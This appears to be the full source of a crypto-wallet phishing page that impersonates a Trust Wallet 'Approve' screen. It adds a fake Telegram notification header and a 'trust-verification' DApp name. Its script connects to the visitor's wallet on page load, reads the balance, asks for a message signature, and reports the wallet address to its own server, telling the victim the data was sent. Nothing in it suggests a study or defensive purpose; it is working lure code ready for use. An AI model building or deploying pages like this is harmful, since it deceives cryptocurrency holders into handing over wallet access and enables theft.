<!DOCTYPE html>
<html>
<head>
    <title>Approve | Trust Wallet</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        body {
            background: #0a0a0a;
            color: white;
            min-height: 100vh;
            padding: 16px;
        }
        
        /* Header - Telegram style */
        .header {
            background: #1e1e1e;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .telegram-icon {
            width: 40px;
            height: 40px;
            background: #0088cc;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 20px;
        }
        
        .header-text h1 {
            font-size: 18px;
            font-weight: 600;
        }
        
        .header-text p {
            color: #999;
            font-size: 14px;
        }
        
        .notification-badge {
            background: #ff3b30;
            color: white;
            width: 22px;
            height: 22px;
            border-radius: 11px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
        }
        
        /* Asset Card */
        .asset-card {
            background: #1e1e1e;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 12px;
        }
        
        .asset-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
        }
        
        .asset-title {
            font-size: 16px;
            font-weight: 600;
        }
        
        .view-details {
            color: #3375bb;
            font-size: 14px;
        }
        
        .asset-details {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .bnb-logo {
            width: 44px;
            height: 44px;
            background: linear-gradient(135deg, #f0b90b 0%, #f8d12f 100%);
            border-radius: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: bold;
        }
        
        .asset-info h3 {
            font-size: 18px;
            margin-bottom: 4px;
        }
        
        .asset-info p {
            color: #999;
            font-size: 14px;
        }
        
        /* DApp Info */
        .dapp-info {
            background: #1e1e1e;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 12px;
        }
        
        .dapp-row {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid #2a2a2a;
        }
        
        .dapp-row:last-child {
            border-bottom: none;
        }
        
        .label {
            color: #999;
            font-size: 14px;
        }
        
        .value {
            font-size: 14px;
            font-weight: 500;
        }
        
        .dapp-url {
            color: #3375bb;
            font-weight: 500;
        }
        
        .network-fee {
            text-align: right;
        }
        
        .network-fee .main {
            font-size: 16px;
            font-weight: 600;
            color: #4caf50;
        }
        
        .network-fee .sub {
            font-size: 12px;
            color: #999;
        }
        
        /* Approve Button */
        .approve-section {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 20px 16px;
            background: linear-gradient(transparent, #0a0a0a 40%);
        }
        
        .approve-button {
            width: 100%;
            background: linear-gradient(135deg, #3375bb 0%, #2b659e 100%);
            color: white;
            border: none;
            padding: 20px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .approve-button:hover {
            background: linear-gradient(135deg, #2b659e 0%, #22558c 100%);
        }
        
        .approve-button:disabled {
            background: #2a2a2a;
            color: #666;
            cursor: not-allowed;
        }
        
        /* Loading */
        .loading {
            text-align: center;
            padding: 40px;
            color: #999;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #3375bb;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Status Message */
        .status-message {
            background: rgba(76, 175, 80, 0.1);
            border: 1px solid #4caf50;
            color: #4caf50;
            padding: 12px;
            border-radius: 8px;
            margin: 12px 0;
            text-align: center;
            display: none;
        }
        
        /* Wallet Address */
        .wallet-address {
            background: #2a2a2a;
            padding: 12px;
            border-radius: 8px;
            margin: 12px 0;
            font-family: monospace;
            font-size: 14px;
            text-align: center;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <!-- Telegram Header -->
    <div class="header">
        <div class="header-left">
            <div class="telegram-icon">T</div>
            <div class="header-text">
                <h1>Telegram - Now</h1>
                <p>3 notifications</p>
            </div>
        </div>
        <div class="notification-badge">3</div>
    </div>
    
    <!-- Asset Card -->
    <div class="asset-card">
        <div class="asset-header">
            <div class="asset-title">Asset</div>
            <div class="view-details">View details</div>
        </div>
        <div class="asset-details">
            <div class="bnb-logo">B</div>
            <div class="asset-info">
                <h3>BNB Smart Chain (BNB)</h3>
                <p id="balanceDisplay">Loading balance...</p>
            </div>
        </div>
    </div>
    
    <!-- DApp Info -->
    <div class="dapp-info">
        <div class="dapp-row">
            <div class="label">DApp</div>
            <div class="value dapp-url" id="dappUrl">trust-verification.vercel.app</div>
        </div>
        <div class="dapp-row">
            <div class="label">Network fee</div>
            <div class="value network-fee">
                <div class="main">$0.00</div>
                <div class="sub">0.00000404 BNB</div>
            </div>
        </div>
    </div>
    
    <!-- Wallet Address -->
    <div class="wallet-address" id="walletAddress" style="display: none;">
        Wallet: Connecting...
    </div>
    
    <!-- Loading -->
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <p>Connecting to Trust Wallet...</p>
    </div>
    
    <!-- Status Message -->
    <div class="status-message" id="statusMessage"></div>
    
    <!-- Approve Button -->
    <div class="approve-section">
        <button class="approve-button" id="approveBtn" onclick="approveTransaction()" disabled>
            Approve
        </button>
    </div>

    <script>
        const dappUrl = window.location.hostname || 'trust-verification.app';
        document.getElementById('dappUrl').textContent = dappUrl;
        
        let currentWallet = null;
        let walletBalance = "0.00000000";
        
        // Auto-connect on page load
        window.onload = async function() {
            if (!window.ethereum) {
                showStatus('Please open in Trust Wallet browser', true);
                return;
            }
            
            try {
                // Check if already connected
                const accounts = await window.ethereum.request({ 
                    method: 'eth_accounts' 
                });
                
                if (accounts.length > 0) {
                    currentWallet = accounts[0];
                    showWalletInfo();
                    getWalletBalance();
                } else {
                    // Auto-request connection (Trust Wallet does this)
                    await connectWallet();
                }
                
            } catch (error) {
                showStatus('Error: ' + error.message, true);
            }
        };
        
        async function connectWallet() {
            try {
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                
                if (accounts.length > 0) {
                    currentWallet = accounts[0];
                    showWalletInfo();
                    getWalletBalance();
                }
            } catch (error) {
                if (error.code === 4001) {
                    showStatus('Connection rejected. Please try again.', true);
                } else {
                    showStatus('Error connecting: ' + error.message, true);
                }
            }
        }
        
        function showWalletInfo() {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('walletAddress').style.display = 'block';
            document.getElementById('walletAddress').innerHTML = 
                `<strong>Wallet:</strong> ${currentWallet.substring(0, 8)}...${currentWallet.substring(currentWallet.length - 6)}`;
            document.getElementById('approveBtn').disabled = false;
        }
        
        async function getWalletBalance() {
            try {
                if (!currentWallet) return;
                
                const balance = await window.ethereum.request({
                    method: 'eth_getBalance',
                    params: [currentWallet, 'latest']
                });
                
                const wei = parseInt(balance, 16);
                walletBalance = (wei / 1e18).toFixed(8);
                
                // Calculate USD value (approx $300 per BNB)
                const usdValue = (parseFloat(walletBalance) * 300).toFixed(2);
                document.getElementById('balanceDisplay').textContent = 
                    `${walletBalance} BNB ($${usdValue})`;
                
            } catch (error) {
                document.getElementById('balanceDisplay').textContent = 'Balance unavailable';
            }
        }
        
        async function approveTransaction() {
            const approveBtn = document.getElementById('approveBtn');
            const status = document.getElementById('statusMessage');
            
            if (!currentWallet) {
                showStatus('Wallet not connected', true);
                return;
            }
            
            try {
                approveBtn.disabled = true;
                approveBtn.textContent = 'Approving...';
                
                // Show processing state
                status.style.display = 'block';
                status.style.background = 'rgba(51, 117, 187, 0.1)';
                status.style.borderColor = '#3375bb';
                status.style.color = '#3375bb';
                status.textContent = 'Processing approval...';
                
                // Sign a message (like Trust Wallet approval)
                const message = `Approve connection to ${dappUrl}\n\nWallet: ${currentWallet}\nTime: ${Date.now()}`;
                
                const signature = await window.ethereum.request({
                    method: 'personal_sign',
                    params: [message, currentWallet]
                });
                
                // Send to server
                const response = await fetch(`/verify-approval?wallet=${currentWallet}`);
                const result = await response.json();
                
                if (result.success) {
                    // Success
                    status.style.background = 'rgba(76, 175, 80, 0.1)';
                    status.style.borderColor = '#4caf50';
                    status.style.color = '#4caf50';
                    status.textContent = '✅ Approved! Data sent successfully';
                    
                    approveBtn.textContent = '✅ Approved';
                    approveBtn.style.background = 'linear-gradient(135deg, #4caf50 0%, #2e7d32 100%)';
                    
                    // Update balance display
                    document.getElementById('balanceDisplay').textContent = 
                        `${result.balance} BNB ($${result.usdValue})`;
                    
                    // Show success alert
                    setTimeout(() => {
                        alert('✅ Transaction Approved!\n\nWallet verified and data sent.');
                    }, 500);
                    
                } else {
                    throw new Error(result.error || 'Approval failed');
                }
                
            } catch (error) {
                showStatus('Error: ' + error.message, true);
                approveBtn.disabled = false;
                approveBtn.textContent = 'Approve';
            }
        }
        
        function showStatus(message, isError = false) {
            const status = document.getElementById('statusMessage');
            status.style.display = 'block';
            
            if (isError) {
                status.style.background = 'rgba(244, 67, 54, 0.1)';
                status.style.borderColor = '#f44336';
                status.style.color = '#f44336';
            } else {
                status.style.background = 'rgba(51, 117, 187, 0.1)';
                status.style.borderColor = '#3375bb';
                status.style.color = '#3375bb';
            }
            
            status.textContent = message;
        }
        
        // Listen for account changes
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    // Wallet disconnected
                    currentWallet = null;
                    document.getElementById('approveBtn').disabled = true;
                    document.getElementById('loading').style.display = 'block';
                    document.getElementById('walletAddress').style.display = 'none';
                    showStatus('Wallet disconnected. Please reconnect.', true);
                } else {
                    currentWallet = accounts[0];
                    showWalletInfo();
                    getWalletBalance();
                }
            });
        }
    </script>
</body>
</html>
